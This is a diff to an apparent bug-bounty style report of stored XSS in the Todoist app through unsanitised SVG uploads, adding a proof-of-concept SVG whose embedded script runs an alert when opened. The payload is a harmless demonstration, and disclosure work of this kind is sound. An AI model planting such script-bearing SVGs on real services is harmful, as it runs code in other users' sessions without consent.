@@ -1,4 +1,4 @@
-Todoist App version 8896— Stored XSS via SVG Upload
+Todoist App - version 8896— Stored XSS via SVG Upload
 
 **Class:** Stored XSS (unsafe SVG rendering)
 
@@ -12,6 +12,20 @@ Summary
 ```
 Uploaded SVG files are returned with Content-Type: image/svg+xml and inline disposition from a signed CloudFront URL. No sanitization or CSP sandbox is applied, so embedded JavaScript executes when a user opens the attachment from a Todoist task/comment.
 ```
+⸻
+
+PoC (poc.svg)
+
+```
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script><![CDATA[
+    alert(prompt("sender_sefa_basnak"));
+  ]]></script>
+  <rect width="10" height="10" fill="red"/>
+</svg>
+```
+This produces a malicious inline <script> node in the SVG that executes
+
 ⸻
 
 1) Upload malicious SVG
